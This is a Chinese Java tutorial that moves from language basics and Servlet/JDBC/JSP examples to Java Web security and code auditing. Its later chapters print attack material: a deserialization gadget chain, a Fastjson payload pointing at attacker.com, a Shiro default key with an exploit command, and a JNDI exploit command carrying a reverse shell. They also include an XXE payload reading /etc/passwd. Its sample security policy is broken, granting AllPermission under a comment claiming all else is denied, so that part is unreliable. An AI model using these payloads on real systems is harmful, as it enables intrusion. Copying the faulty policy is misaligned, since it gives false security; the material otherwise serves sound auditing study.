# Java 基础

> 本文档系统介绍 Java 编程语言和 Java Web 开发的核心知识，配合 java 目录中的代码示例，帮助快速掌握 Java Web 开发，为 Java 代码审计和漏洞学习奠定基础。

---

## 目录

- [第一章：Java 概述](#第一章java-概述)
- [第二章：基础语法](#第二章基础语法)
- [第三章：面向对象](#第三章面向对象)
- [第四章：数组与集合](#第四章数组与集合)
- [第五章：异常处理](#第五章异常处理)
- [第六章：Java Web 基础](#第六章java-web-基础)
- [第七章：Servlet](#第七章servlet)
- [第八章：JDBC 数据库操作](#第八章jdbc-数据库操作)
- [第九章：JSP 基础](#第九章jsp-基础)
- [第十章：Java 安全基础](#第十章java-安全基础)

---

## 第一章：Java 概述

Java 是 Sun 公司（现 Oracle）开发的面向对象编程语言，以"一次编写，到处运行"（Write Once, Run Anywhere）著称。Java Web 是企业级应用的主流技术栈。

**特点**：强类型、面向对象、跨平台（JVM）、生态庞大、性能好、稳定性高。

**三大版本**：
- **Java SE**（标准版）：基础核心
- **Java EE**（企业版）：Web/企业应用
- **Java ME**（微型版）：嵌入式/移动设备

**开发环境**：JDK（Java Development Kit）+ IDE（IDEA / Eclipse）

---

## 第二章：基础语法

### 2.1 第一个程序

```java
// HelloWorld.java
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!");
    }
}
```

**编译运行**：
```bash
javac HelloWorld.java   # 编译，生成 HelloWorld.class
java HelloWorld         # 运行
```

### 2.2 变量与数据类型

```java
// 基本数据类型
byte b = 127;           // 1字节
short s = 32767;        // 2字节
int i = 100;            // 4字节
long l = 99999L;        // 8字节
float f = 3.14f;        // 4字节
double d = 3.14159;     // 8字节
char c = 'A';           // 2字节
boolean bool = true;    // true/false

// 引用类型
String str = "Hello";   // 字符串
int[] arr = {1, 2, 3};  // 数组
```

### 2.3 运算符

| 类别 | 运算符 |
|------|--------|
| 算术 | `+` `-` `*` `/` `%` `++` `--` |
| 比较 | `==` `!=` `>` `<` `>=` `<=` |
| 逻辑 | `&&` `||` `!` |
| 位运算 | `&` `|` `^` `~` `<<` `>>` `>>>` |
| 赋值 | `=` `+=` `-=` `*=` `/=` `%=` |
| 三元 | `条件 ? 值1 : 值2` |

### 2.4 类型转换

```java
// 自动转换（小→大）
int a = 10;
double b = a;     // int → double

// 强制转换（大→小，可能损失精度）
double c = 3.14;
int d = (int) c;   // 3
```

---

## 第三章：面向对象

### 3.1 类与对象

```java
public class Person {
    // 成员变量（属性）
    private String name;
    private int age;

    // 构造方法
    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    // 成员方法
    public void greet() {
        System.out.println("你好，我是" + name);
    }

    // Getter / Setter
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public int getAge() { return age; }
    public void setAge(int age) { this.age = age; }
}

// 使用
Person p = new Person("张三", 25);
p.greet();
System.out.println(p.getName());
```

### 3.2 三大特性

| 特性 | 说明 | 关键字 |
|------|------|--------|
| **封装** | 隐藏内部细节，暴露公共接口 | `private` `public` `protected` |
| **继承** | 子类复用父类属性和方法 | `extends` |
| **多态** | 同一接口不同实现 | 方法重写、重载 |

```java
// 继承
public class Student extends Person {
    private String school;

    public Student(String name, int age, String school) {
        super(name, age);  // 调用父类构造
        this.school = school;
    }

    // 方法重写（Override）
    @Override
    public void greet() {
        System.out.println("我是学生" + getName());
    }
}
```

### 3.3 接口与抽象类

```java
// 接口
public interface Animal {
    void eat();    // 抽象方法
    void sleep();
}

// 实现接口
public class Dog implements Animal {
    @Override
    public void eat() {
        System.out.println("狗吃骨头");
    }

    @Override
    public void sleep() {
        System.out.println("狗睡觉");
    }
}
```

---

## 第四章：数组与集合

### 4.1 数组

```java
// 声明和初始化
int[] nums = new int[5];
int[] nums = {1, 2, 3, 4, 5};
String[] names = {"张三", "李四", "王五"};

// 访问
System.out.println(nums[0]);    // 第一个元素
System.out.println(nums.length); // 数组长度

// 遍历
for (int i = 0; i < nums.length; i++) {
    System.out.println(nums[i]);
}

for (int num : nums) {  // 增强 for 循环
    System.out.println(num);
}
```

### 4.2 集合框架

#### List（列表）

```java
import java.util.*;

// ArrayList
List<String> list = new ArrayList<>();
list.add("apple");        // 添加
list.get(0);              // 获取
list.size();              // 大小
list.remove(0);           // 删除
list.contains("apple");   // 包含

// 遍历
for (String item : list) {
    System.out.println(item);
}
```

#### Map（键值对）

```java
Map<String, Integer> map = new HashMap<>();
map.put("张三", 25);      // 添加
map.get("张三");          // 获取
map.containsKey("张三");  // 判断键
map.size();               // 大小
map.remove("张三");       // 删除

// 遍历
for (Map.Entry<String, Integer> entry : map.entrySet()) {
    System.out.println(entry.getKey() + ": " + entry.getValue());
}
```

#### Set（集合，不重复）

```java
Set<String> set = new HashSet<>();
set.add("a");
set.add("b");
set.size();
set.contains("a");
```

---

## 第五章：异常处理

```java
try {
    // 可能抛出异常的代码
    int result = 10 / 0;
} catch (ArithmeticException e) {
    // 捕获算术异常
    System.out.println("算术错误: " + e.getMessage());
    e.printStackTrace();
} catch (Exception e) {
    // 捕获其他异常
    System.out.println("发生错误: " + e.getMessage());
} finally {
    // 无论是否异常都会执行
    System.out.println("finally 块");
}

// 抛出异常
public void checkAge(int age) {
    if (age < 0) {
        throw new IllegalArgumentException("年龄不能为负");
    }
}

// 自定义异常
class MyException extends Exception {
    public MyException(String message) {
        super(message);
    }
}
```

**常见异常类**：
- `NullPointerException` - 空指针
- `ArrayIndexOutOfBoundsException` - 数组越界
- `ClassCastException` - 类型转换错误
- `SQLException` - 数据库异常
- `IOException` - IO 异常

---

## 第六章：Java Web 基础

### 6.1 Web 技术栈

| 技术 | 说明 |
|------|------|
| **Servlet** | Java Web 基础，处理 HTTP 请求 |
| **JSP** | Java Server Pages，HTML 嵌入 Java |
| **JDBC** | Java 数据库连接 |
| **Filter** | 过滤器 |
| **Listener** | 监听器 |
| **Spring MVC** | MVC 框架 |
| **Spring Boot** | 快速开发框架 |
| **MyBatis / JPA** | 持久层框架 |

### 6.2 Web 项目结构

```
webapp/
├── WEB-INF/
│   ├── web.xml          # 配置文件
│   ├── classes/         # 编译后的 class 文件
│   └── lib/             # 依赖 jar 包
├── index.jsp            # 首页
└── static/              # 静态资源
    ├── css/
    ├── js/
    └── images/
```

---

## 第七章：Servlet

Servlet 是运行在服务器端的 Java 程序，用于处理 HTTP 请求和生成响应。

```java
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;

public class HelloServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request,
                         HttpServletResponse response)
            throws ServletException, IOException {

        response.setContentType("text/html;charset=UTF-8");
        PrintWriter out = response.getWriter();

        String name = request.getParameter("name");
        if (name == null) name = "访客";

        out.println("<html><body>");
        out.println("<h1>你好，" + name + "！</h1>");
        out.println("</body></html>");
    }

    @Override
    protected void doPost(HttpServletRequest request,
                          HttpServletResponse response)
            throws ServletException, IOException {
        doGet(request, response);
    }
}
```

**web.xml 配置**：
```xml
<servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>com.example.HelloServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/hello</url-pattern>
</servlet-mapping>
```

**Servlet 生命周期**：
1. 实例化 → 2. 初始化（init()）→ 3. 处理请求（service()/doGet/doPost）→ 4. 销毁（destroy()）

**常用对象**：
- `HttpServletRequest` - 请求对象（获取参数、Cookie、Session 等）
- `HttpServletResponse` - 响应对象（输出内容、设置响应头等）
- `HttpSession` - 会话对象
- `ServletContext` - 全局上下文

---

## 第八章：JDBC 数据库操作

```java
import java.sql.*;

public class JdbcExample {
    public static void main(String[] args) {
        String url = "jdbc:mysql://localhost:3306/testdb?useSSL=false&serverTimezone=UTC";
        String user = "root";
        String password = "123456";

        Connection conn = null;
        try {
            // 1. 加载驱动
            Class.forName("com.mysql.cj.jdbc.Driver");

            // 2. 建立连接
            conn = DriverManager.getConnection(url, user, password);
            System.out.println("连接成功");

            // 3. 查询
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT id, name, age FROM users");

            while (rs.next()) {
                int id = rs.getInt("id");
                String name = rs.getString("name");
                int age = rs.getInt("age");
                System.out.println(id + ": " + name + ", " + age);
            }
            rs.close();
            stmt.close();

            // 4. 预处理（防 SQL 注入，推荐）
            String sql = "INSERT INTO users (name, age) VALUES (?, ?)";
            PreparedStatement pstmt = conn.prepareStatement(sql);
            pstmt.setString(1, "张三");
            pstmt.setInt(2, 25);
            pstmt.executeUpdate();
            pstmt.close();

        } catch (ClassNotFoundException e) {
            System.out.println("驱动加载失败: " + e.getMessage());
        } catch (SQLException e) {
            System.out.println("数据库错误: " + e.getMessage());
            e.printStackTrace();
        } finally {
            // 5. 关闭连接
            try {
                if (conn != null) conn.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }
}
```

> ⚠️ **必须使用 PreparedStatement 防止 SQL 注入**。

---

## 第九章：JSP 基础

JSP（Java Server Pages）允许在 HTML 中嵌入 Java 代码，简化动态页面开发。

```jsp
<!-- index.jsp -->
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.util.Date" %>
<html>
<head><title>JSP 示例</title></head>
<body>
    <h1>欢迎来到 JSP！</h1>
    <p>当前时间：<%= new Date() %></p>

    <%-- JSP 注释 --%>

    <%-- 脚本片段 --%>
    <%
        String name = "张三";
        int age = 25;
    %>
    <p>姓名：<%= name %></p>
    <p>年龄：<%= age %></p>

    <%-- 声明 --%>
    <%!
        public String sayHello(String name) {
            return "Hello, " + name + "!";
        }
    %>
    <p><%= sayHello("World") %></p>

    <%-- 条件判断 --%>
    <% if (age >= 18) { %>
        <p>成年</p>
    <% } else { %>
        <p>未成年</p>
    <% } %>

    <%-- 循环 --%>
    <ul>
    <% for (int i = 1; i <= 5; i++) { %>
        <li>第 <%= i %> 项</li>
    <% } %>
    </ul>
</body>
</html>
```

**JSP 九大内置对象**：
- `request` - HttpServletRequest
- `response` - HttpServletResponse
- `session` - HttpSession
- `application` - ServletContext
- `out` - JspWriter
- `page` - 当前页面
- `pageContext` - 页面上下文
- `config` - ServletConfig
- `exception` - 异常对象

---

## 第十章：Java 安全基础

### 常见 Java Web 漏洞

| 漏洞类型 | 说明 | 防护方法 |
|---------|------|---------|
| **SQL 注入** | SQL 语句拼接用户输入 | PreparedStatement、MyBatis 参数化 |
| **XSS** | 输出未转义 | 输出转义、CSP |
| **CSRF** | 跨站请求伪造 | Token 验证 |
| **文件上传** | 上传恶意文件 | 类型校验、重命名、目录隔离 |
| **命令注入** | Runtime.exec 拼接用户输入 | 白名单、参数校验 |
| **反序列化漏洞** | 不安全的反序列化 | 禁止反序列化不可信数据 |
| **表达式注入** | OGNL/SpEL 表达式注入 | 禁止用户输入表达式 |
| **SSRF** | 服务端请求伪造 | 限制请求目标 |
| **逻辑漏洞** | 业务逻辑缺陷 | 严格的权限控制和流程校验 |

**安全最佳实践**：
1. 输入验证（白名单）
2. 输出编码（根据上下文）
3. 使用参数化查询
4. 最小权限原则
5. 安全配置（禁用危险功能）
6. 依赖安全（及时更新有漏洞的第三方库）
7. 日志与审计
8. 代码安全审计

---

## 代码示例

详见 `java/` 目录中的示例文件：
- `HelloWorld.java` - 第一个 Java 程序
- `User.java` - 类与对象示例
- `HelloServlet.java` - Servlet 示例
- `JdbcExample.java` - JDBC 数据库操作

> **延伸学习**：Java 是企业级 Web 应用的主流技术，也是代码审计的重要方向。掌握 Java 基础后，可进一步学习 Spring 框架、Java 反序列化漏洞、常见框架漏洞（Struts2、Spring、Shiro 等）。

---

## 第十一章：Spring Security 配置与安全

### 11.1 Spring Security 基础配置

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            // CSRF 防护
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .and()
            // 授权配置
            .authorizeRequests()
                .antMatchers("/public/**").permitAll()
                .antMatchers("/admin/**").hasRole("ADMIN")
                .antMatchers("/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
                .and()
            // 表单登录
            .formLogin()
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard")
                .failureHandler(new CustomAuthenticationFailureHandler())
                .and()
            // 会话管理
            .sessionManagement()
                .sessionFixation().migrateSession()  // 防会话固定
                .maximumSessions(1)                   // 单点登录
                .maxSessionsPreventsLogin(false)      // 踢出旧会话
                .and()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .and()
            // 安全头
            .headers()
                .xssProtection().xssProtectionEnabled(true)
                .and()
                .contentTypeOptions()
                .and()
                .httpStrictTransportSecurity()
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                .and()
                .frameOptions().sameOrigin()
                .and()
            // Remember-Me 安全
            .rememberMe()
                .key("uniqueSecretKey")
                .tokenValiditySeconds(86400)
                .and()
            // 注销
            .logout()
                .logoutUrl("/logout")
                .logoutSuccessUrl("/login?logout")
                .deleteCookies("JSESSIONID")
                .invalidateHttpSession(true);
    }

    // 密码编码器
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }
}
```

### 11.2 Spring Security 方法级安全

```java
@Service
public class UserService {

    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(Long userId) { ... }

    @PreAuthorize("#userId == authentication.principal.id or hasRole('ADMIN')")
    public User getUser(Long userId) { ... }

    @PostAuthorize("returnObject.owner == authentication.principal.username")
    public Document getDocument(Long docId) { ... }

    @Secured("ROLE_ADMIN")
    public List<User> getAllUsers() { ... }
}
```

---

## 第十二章：Java 反序列化漏洞深度分析

### 12.1 Java 反序列化原理

Java 提供了 `ObjectInputStream.readObject()` 方法将序列化数据还原为对象。反序列化过程中会自动调用对象的 `readObject()`、`readResolve()` 等方法，攻击者可以构造恶意序列化数据触发任意代码执行。

```java
// 漏洞代码
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // 危险！反序列化不可信数据
```

### 12.2 Commons Collections 利用链分析

Apache Commons Collections 库中的 `InvokerTransformer` 类可以链式调用方法，是反序列化漏洞的经典利用链。

```java
// CC1 利用链（简化版）
// 利用链入口：LazyMap.decorate()
// 核心组件：
//   1. TransformerChain（变换链）
//   2. ChainedTransformer（链式变换）
//   3. InvokerTransformer（方法调用变换器）

// 构造利用链
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    // 获取 Runtime.exec 方法
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    // 调用 Runtime.getRuntime()
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    // 调用 exec("calc")
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc.exe"})
};

ChainedTransformer chain = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chain);
```

### 12.3 常见反序列化漏洞组件

| 组件 | CVE | 利用方式 |
|------|-----|---------|
| **Commons Collections** | CVE-2015-7501 | InvokerTransformer 链 |
| **Commons BeanUtils** | CVE-2014-0114 | BeanComparator |
| **Fastjson** | 多个 CVE | autoType 特性 |
| **Jackson** | 多个 CVE | enableDefaultTyping |
| **Shiro** | CVE-2016-4437 | RememberMe Cookie |
| **Log4j** | CVE-2021-44228 | JNDI 注入 |
| **WebLogic** | 多个 CVE | T3 协议反序列化 |

### 12.4 Fastjson 反序列化

```java
// 漏洞代码
String json = request.getParameter("data");
Object obj = JSON.parse(json);  // autoType 开启时可执行任意类

// 利用 Payload
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://attacker.com/Exploit",
    "autoCommit":true
}

// 攻击流程：
// 1. Fastjson 解析 @type 指定的类
// 2. 实例化 JdbcRowSetImpl
// 3. 调用 setDataSourceName 设置 JNDI URL
// 4. 调用 setAutoCommit 触发 JNDI 连接
// 5. 攻击者 JNDI 服务器返回恶意类
// 6. 执行任意代码

// 防护：
// 1. 升级到 Fastjson 1.2.68+（默认关闭 autoType）
// 2. 配置 safeMode：ParserConfig.getGlobalInstance().setSafeMode(true)
// 3. 使用白名单：ParserConfig.addAllow()
```

### 12.5 Shiro 反序列化（CVE-2016-4437）

```bash
# Shiro RememberMe 反序列化漏洞
# 原理：Shiro 使用 AES 加密 Cookie，默认密钥为 kPH+bIxk5D2deZiIxcaaaA==

# 检测：
# 发送请求，Cookie 中设置 rememberMe=deleteMe
# 如果响应中 Set-Cookie 含 rememberMe=deleteMe，说明使用 Shiro

# 利用：
# 1. 使用已知默认密钥 AES 解密
# 2. 修改序列化对象为恶意利用链
# 3. AES 加密后设置到 Cookie
# 4. 发送请求触发反序列化

# 工具：shiro-550-exploit
python shiro_exploit.py -u http://target.com -t 2
```

---

## 第十三章：JNDI 注入漏洞

### 13.1 JNDI 注入原理

JNDI（Java Naming and Directory Interface）是 Java 的命名和目录接口。攻击者通过控制 JNDI 查找的 URL，可以加载远程恶意类执行代码。

```java
// 漏洞代码
String jndiName = request.getParameter("name");
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup(jndiName);
// 如果 jndiName = "ldap://attacker.com/Exploit"
// 会从远程 LDAP 服务器加载恶意类
```

### 13.2 JNDI 注入利用方式

```
利用方式分类：

1. RMI 注入（JDK < 8u121）
   rmi://attacker.com:1099/Exploit
   利用远程类加载

2. LDAP 注入（JDK < 8u191）
   ldap://attacker.com:1389/Exploit
   利用远程类加载或序列化对象

3. DNS 注入
   dns://attacker.com/example
   用于信息探测

4. CORBA 注入
   iiop://attacker.com:7777/Exploit

5. 高版本绕过
   JDK 8u191+：
   - 使用 BeanFactory 绕过
   - 使用 EL 表达式绕过
   - 使用 Groovy 绕过
```

### 13.3 JNDI 注入工具

```bash
# marshalsec 工具
# 启动恶意 LDAP 服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8888/#Exploit

# JNDI-Injection-Exploit
# 自动生成 JNDI 利用 payload
java -jar JNDI-Injection-Exploit.jar -C "bash -i >& /dev/tcp/attacker/4444 0>&1" -H "attacker.com"
```

---

## 第十四章：Java 代码审计技巧

### 14.1 常见危险函数审计

```java
// ====== 命令执行 ======
Runtime.getRuntime().exec(userInput);           // 命令注入
ProcessBuilder pb = new ProcessBuilder(cmd);    // 命令注入
ScriptEngine.eval(userInput);                   // 脚本执行

// ====== 文件操作 ======
new FileInputStream(userInput);                // 任意文件读取
new FileOutputStream(userInput);                // 任意文件写入
Files.readAllLines(Paths.get(userInput));       // 任意文件读取
Files.write(Paths.get(userInput), data);        // 任意文件写入

// ====== 网络请求（SSRF） ======
URL.openConnection();                           // URL 请求
HttpClient.execute(new HttpGet(userInput));      // HTTP 请求
RestTemplate.getForObject(userInput, cls);      // REST 请求

// ====== 表达式注入 ======
// OGNL
Ognl.getValue(userInput, context);
// SpEL（Spring 表达式）
parser.parseExpression(userInput).getValue();
// MVEL
MVEL.eval(userInput);

// ====== XML 解析（XXE） ======
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);  // 未禁用外部实体
```

### 14.2 SQL 注入审计模式

```java
// MyBatis 注入（${} 不安全，#{} 安全）
@Select("SELECT * FROM users WHERE name = #{name}")  // 安全
@Select("SELECT * FROM users WHERE name = '${name}'") // 危险

// 动态 SQL 中的注入
@Select("SELECT * FROM users ORDER BY ${orderBy}")   // 危险（ORDER BY 无法参数化）
// 解决方案：白名单验证 orderBy 参数

// Hibernate HQL 注入
String hql = "FROM User WHERE name = '" + name + "'";  // 危险
Query query = session.createQuery(hql);
// 安全写法
String hql = "FROM User WHERE name = :name";
Query query = session.createQuery(hql).setParameter("name", name);
```

### 14.3 文件上传审计

```java
// 危险代码
@RequestMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();
    file.transferTo(new File("/uploads/" + filename));  // 原始文件名，可目录穿越
    return "success";
}

// 安全代码
public String secureUpload(MultipartFile file) {
    // 1. 白名单验证后缀
    String ext = FilenameUtils.getExtension(file.getOriginalFilename());
    if (!Arrays.asList("jpg", "png", "pdf").contains(ext.toLowerCase())) {
        throw new IllegalArgumentException("Invalid file type");
    }

    // 2. 验证文件大小
    if (file.getSize() > 2 * 1024 * 1024) {
        throw new IllegalArgumentException("File too large");
    }

    // 3. 随机文件名
    String newName = UUID.randomUUID() + "." + ext;

    // 4. 存储到安全目录
    Path uploadPath = Paths.get("/safe-uploads/");
    file.transferTo(uploadPath.resolve(newName));

    return newName;
}
```

---

## 第十五章：JVM 安全机制

### 15.1 Java Security Manager

```bash
# 启用 Security Manager
java -Djava.security.manager -Djava.security.policy==security.policy MyApp

# security.policy 文件
grant {
    // 基本权限
    permission java.lang.RuntimePermission "exitVM";
    permission java.util.PropertyPermission "*", "read";
    
    // 文件权限
    permission java.io.FilePermission "/app/*", "read";
    permission java.io.FilePermission "/tmp/*", "read,write,delete";
    
    // 网络权限
    permission java.net.SocketPermission "localhost:3306", "connect";
    
    // 拒绝所有其他权限
    permission java.security.AllPermission "";
};
```

### 15.2 JVM 沙箱限制

```
JVM 沙箱安全层次：
1. 类加载器（ClassLoader）：命名空间隔离
2. 字节码验证器（Bytecode Verifier）：检查字节码合法性
3. Security Manager：运行时权限检查
4. JIT 编译器优化检查

绕过场景：
- 利用反射调用 setSecurityManager(null)
- 利用反序列化调用无权限检查的方法
- 类加载器泄露攻击
```

---

## 第十六章：Java Agent 技术

### 16.1 Java Agent 基础

Java Agent 是一种在类加载时修改字节码的技术，可用于安全测试和防御。

```java
// Agent 入口类
public class SecurityAgent {
    // JVM 启动时加载
    public static void premain(String args, Instrumentation inst) {
        // 注册字节码转换器
        inst.addTransformer(new SecurityTransformer());
    }

    // JVM 运行时加载（attach API）
    public static void agentmain(String args, Instrumentation inst) {
        inst.addTransformer(new SecurityTransformer(), true);
        try {
            inst.retransformClasses(Runtime.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 字节码转换器（使用 ASM/Javassist）
public class SecurityTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className,
            Class<?> classBeingRedefined,
            ProtectionDomain protectionDomain,
            byte[] classfileBuffer) {
        // 修改 Runtime.exec() 添加日志/限制
        if (className.equals("java/lang/Runtime")) {
            return modifyRuntimeClass(classfileBuffer);
        }
        return classfileBuffer;
    }
}
```

### 16.2 Agent 安全应用

```
安全应用场景：
1. RASP（运行时应用自我保护）
   - Hook Runtime.exec() 检测命令注入
   - Hook FileInputStream 检测路径遍历
   - Hook ObjectInputStream 检测反序列化
   
2. 免杀
   - 修改恶意类的字节码特征
   - 绕过基于特征码的检测

3. 动态插桩
   - 不修改源码添加安全检查
   - 运行时监控方法调用

4. 内存马检测
   - 检测动态加载的类
   - 发现未授权的 ClassLoader
```

---

## 第十七章：Maven/Gradle 依赖安全

### 17.1 Maven 依赖安全

```xml
<!-- pom.xml 中声明依赖 -->
<dependencies>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.4</version>
        <!-- 排除有漏洞的传递依赖 -->
        <exclusions>
            <exclusion>
                <groupId>commons-beanutils</groupId>
                <artifactId>commons-beanutils-core</artifactId>
            </exclusion>
        </exclusions>
    </dependency>
</dependencies>

<!-- 使用 dependencyManagement 统一管理版本 -->
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-dependencies</artifactId>
            <version>2.7.18</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

### 17.2 依赖安全扫描

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# 输出报告：target/dependency-check-report.html

# Gradle 版本
./gradlew dependencyCheckAnalyze

# 使用 Snyk 扫描
snyk test --file=pom.xml

# 使用 Trivy 扫描
trivy fs .

# 常见漏洞依赖
# log4j-core < 2.17.0  → CVE-2021-44228 (Log4Shell)
# commons-collections < 3.2.2  → CVE-2015-7501
# fastjson < 1.2.83  → 多个反序列化 CVE
# spring-core < 5.3.20  → CVE-2022-22965 (Spring4Shell)
```

---

## 第十八章：Java 加密库（JCA/JCE）

### 18.1 JCA（Java Cryptography Architecture）

```java
// ====== 消息摘要（哈希） ======
MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] hash = md.digest(data.getBytes(StandardCharsets.UTF_8));

// ====== MAC（消息认证码） ======
Mac mac = Mac.getInstance("HmacSHA256");
SecretKeySpec key = new SecretKeySpec(keyBytes, "HmacSHA256");
mac.init(key);
byte[] macResult = mac.doFinal(data.getBytes());

// ====== 签名 ======
Signature sig = Signature.getInstance("SHA256withRSA");
sig.initSign(privateKey);
sig.update(data);
byte[] signature = sig.sign();

// 验证签名
sig.initVerify(publicKey);
sig.update(data);
boolean isValid = sig.verify(signature);
```

### 18.2 JCE（Java Cryptography Extension）

```java
// ====== 对称加密（AES） ======
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
SecretKey key = new SecretKeySpec(keyBytes, "AES");
GCMParameterSpec spec = new GCMParameterSpec(128, iv);
cipher.init(Cipher.ENCRYPT_MODE, key, spec);
byte[] encrypted = cipher.doFinal(plaintext);

// ====== 非对称加密（RSA） ======
KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
kpg.initialize(2048);
KeyPair keyPair = kpg.generateKeyPair();

Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
cipher.init(Cipher.ENCRYPT_MODE, keyPair.getPublic());
byte[] encrypted = cipher.doFinal(data);

// ====== 密钥生成 ======
KeyGenerator keyGen = KeyGenerator.getInstance("AES");
keyGen.init(256);
SecretKey secretKey = keyGen.generateKey();

// ====== 安全随机数 ======
SecureRandom random = SecureRandom.getInstanceStrong();
byte[] salt = new byte[16];
random.nextBytes(salt);
```

### 18.3 密码哈希存储

```java
// 使用 BCrypt
import org.mindrot.jbcrypt.BCrypt;

// 哈希密码
String hashed = BCrypt.hashpw(password, BCrypt.gensalt(12));

// 验证密码
boolean isValid = BCrypt.checkpw(inputPassword, hashed);

// 使用 Argon2（更安全）
import de.mkammerer.argon2.Argon2;
import de.mkammerer.argon2.Argon2Factory;

Argon2 argon2 = Argon2Factory.create();
String hash = argon2.hash(4, 65536, 1, password);
boolean isValid = argon2.verify(hash, inputPassword);
```

---

## 第十九章：Java Web Service 安全

### 19.1 Web Service 常见漏洞

```
1. XXE（XML External Entity）
   - SOAP 请求中的 XML 实体注入
   - 读取服务器文件
   - SSRF 攻击

2. WSDL 信息泄露
   - 暴露所有接口和方法
   - 参数类型信息

3. SQL 注入
   - SOAP 参数拼接 SQL

4. 命令注入
   - SOAP 参数传递给系统命令

5. SSRF
   - 通过 WSDL URL 发起服务端请求
```

### 19.2 XXE 漏洞与防护

```java
// 漏洞代码
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream());  // 解析用户 XML

// 攻击 Payload
/*
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
*/

// 防护代码
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 禁用 DTD
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

### 19.3 REST API 安全最佳实践

```java
// ====== JWT 过滤器 ======
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain chain)
            throws ServletException, IOException {

        String header = request.getHeader("Authorization");
        if (header == null || !header.startsWith("Bearer ")) {
            chain.doFilter(request, response);
            return;
        }

        try {
            String token = header.substring(7);
            Claims claims = Jwts.parserBuilder()
                .setSigningKey(secretKey)
                .build()
                .parseClaimsJws(token)
                .getBody();

            String username = claims.getSubject();
            if (username != null) {
                UsernamePasswordAuthenticationToken auth =
                    new UsernamePasswordAuthenticationToken(username, null,
                        authorities);
                SecurityContextHolder.getContext().setAuthentication(auth);
            }
        } catch (Exception e) {
            response.setStatus(401);
            return;
        }

        chain.doFilter(request, response);
    }
}

// ====== 速率限制 ======
@Component
public class RateLimitFilter implements Filter {
    private final Map<String, RateInfo> rateMap = new ConcurrentHashMap<>();

    @Override
    public void doFilter(ServletRequest req, ServletResponse res,
            FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        String ip = request.getRemoteAddr();
        
        RateInfo info = rateMap.computeIfAbsent(ip, k -> new RateInfo());
        if (info.isRateLimited()) {
            ((HttpServletResponse) res).setStatus(429);
            res.getWriter().write("Rate limit exceeded");
            return;
        }
        chain.doFilter(req, res);
    }
}
```

---

## 第二十章：Java 安全编码清单

```
[ ] 使用最新版 JDK（LTS 版本）
[ ] 更新所有依赖到安全版本
[ ] 禁用 ObjectInputStream 反序列化不可信数据
[ ] Fastjson 关闭 autoType 或升级到安全版本
[ ] XML 解析禁用外部实体（XXE 防护）
[ ] 使用 PreparedStatement 或 ORM 防止 SQL 注入
[ ] 文件上传使用白名单验证后缀和内容
[ ] 命令执行使用白名单参数
